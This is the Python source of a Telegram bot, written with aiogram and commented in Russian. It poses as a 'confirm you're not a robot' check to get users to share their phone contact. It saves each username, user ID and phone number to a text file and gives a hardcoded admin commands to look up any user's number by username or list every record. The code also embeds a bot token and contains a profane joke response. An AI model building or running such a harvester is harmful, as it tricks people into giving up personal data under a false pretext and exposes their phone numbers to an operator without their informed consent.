import logging
import asyncio
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, ContentType
from aiogram.filters import Command
from aiogram.client.default import DefaultBotProperties

# Токен бота
TOKEN = "2200614164:AAHwUzO2kttzbRXsn-UV_1wOnYvw25swNiM/test"

# ID Админа
ADMIN_ID = 5000310044

# Логирование
logging.basicConfig(level=logging.INFO)

# Инициализация бота и диспетчера
bot = Bot(
    token=TOKEN,
    default=DefaultBotProperties(parse_mode="HTML")  # Новый способ задания параметров
)
dp = Dispatcher()

# Клавиатура для запроса номера
contact_keyboard = ReplyKeyboardMarkup(
    keyboard=[[KeyboardButton(text="📲 Подтвердите, что вы не робот", request_contact=True)]],
    resize_keyboard=True,
    one_time_keyboard=True
)

# Главное меню (разные версии для обычных юзеров и админа)
def get_menu_keyboard(user_id):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📞 Мой номер", callback_data="my_number")],
        [InlineKeyboardButton(text="ℹ️ Справка", callback_data="help_info")]
    ])
    
    if user_id == ADMIN_ID:
        keyboard.inline_keyboard.insert(1, [InlineKeyboardButton(text="🔍 Найти номер (только для админа)", callback_data="search_number")])
        keyboard.inline_keyboard.insert(2, [InlineKeyboardButton(text="📋 Все пользователи (только для админа)", callback_data="all_users")])
    
    return keyboard

# Команда /start
@dp.message(Command("start"))
async def start_command(message: Message):
    await message.answer("👋 Привет! Подтвердите, что вы не робот, отправив свой номер:", reply_markup=contact_keyboard)

# Обработка контакта
@dp.message(F.contact)
async def contact_handler(message: Message):
    user = message.from_user
    contact = message.contact

    if user.id == contact.user_id:
        user_data = f"@{user.username or 'Нет username'} {user.id} {contact.phone_number}\n"

        try:
            with open("number.txt", "r", encoding="utf-8") as file:
                if str(user.id) in file.read():
                    await message.answer("✅ Вы уже отправили свой номер, ожидайте проверки.", reply_markup=get_menu_keyboard(user.id))
                    return
        except FileNotFoundError:
            pass

        with open("number.txt", "a", encoding="utf-8") as file:
            file.write(user_data)

        await message.answer("✅ Номер сохранен! Теперь вы можете пользоваться меню.", reply_markup=get_menu_keyboard(user.id))
    else:
        await message.answer("❌ Отправьте именно свой номер!")

# Мой номер
@dp.callback_query(F.data == "my_number")
async def my_number(call: CallbackQuery):
    user_id = call.from_user.id
    try:
        with open("number.txt", "r", encoding="utf-8") as file:
            for line in file:
                if str(user_id) in line:
                    await call.message.answer(f"📞 Ваш номер: <code>{line.split()[2]}</code>")
                    return
        await call.message.answer("❌ Ваш номер не найден в базе.")
    except FileNotFoundError:
        await call.message.answer("❌ База данных пуста.")

# Поиск номера (для админа)
@dp.callback_query(F.data == "search_number")
async def search_number_prompt(call: CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        await call.message.answer("⛔ У вас нет прав для поиска номеров.")
        return
    await call.message.answer("🔍 Введите username (без @) для поиска номера:")

# Поиск номера (введенное сообщение)
@dp.message()
async def search_number(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("⛔ У вас нет прав для поиска номеров.")
        return

    search_username = message.text.lstrip("@").lower()

    if search_username == "ukrain3cy":
        await message.answer("а вот хуй тебе)))")
        return

    try:
        with open("number.txt", "r", encoding="utf-8") as file:
            for line in file:
                data = line.strip().split(maxsplit=2)
                if len(data) < 3:
                    continue
                username, user_id, phone_number = data

                if username.lstrip("@").lower() == search_username:
                    user_type = "🤖 Бот" if int(user_id) < 0 else "👤 Пользователь"
                    response = (
                        f"✅ <b>Запись найдена в базе!</b>\n\n"
                        f"👤 <b>Имя:</b> {username}\n"
                        f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
                        f"📞 <b>Номер:</b> <code>+{phone_number}</code>\n"
                        f"🔍 <b>Тип:</b> {user_type}"
                    )
                    await message.answer(response)
                    return

        await message.answer("⚠️ <b>Запись не найдена в базе.</b>")
    except FileNotFoundError:
        await message.answer("⚠️ <b>База данных пуста.</b>")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

# Все пользователи (для админа)
@dp.callback_query(F.data == "all_users")
async def all_users(call: CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        await call.message.answer("⛔ У вас нет прав для выполнения этой команды.")
        return

    try:
        with open("number.txt", "r", encoding="utf-8") as file:
            users = file.readlines()

        if not users:
            await call.message.answer("📂 База данных пуста.")
            return

        response = "📋 <b>Список всех пользователей:</b>\n\n"
        for user in users:
            response += f"👤 {user}\n"

        await call.message.answer(response)
    except FileNotFoundError:
        await call.message.answer("⚠️ База данных не найдена.")

# Справка
@dp.callback_query(F.data == "help_info")
async def help_info(call: CallbackQuery):
    text = (
        "ℹ️ <b>Доступные команды:</b>\n\n"
        "📞 <b>Мой номер</b> – показать ваш номер\n"
        "🔍 <b>Найти номер (только для админа)</b> – поиск номера по username\n"
        "📋 <b>Все пользователи (только для админа)</b> – список всех пользователей\n"
    )
    await call.message.answer(text)

# Запуск бота
async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
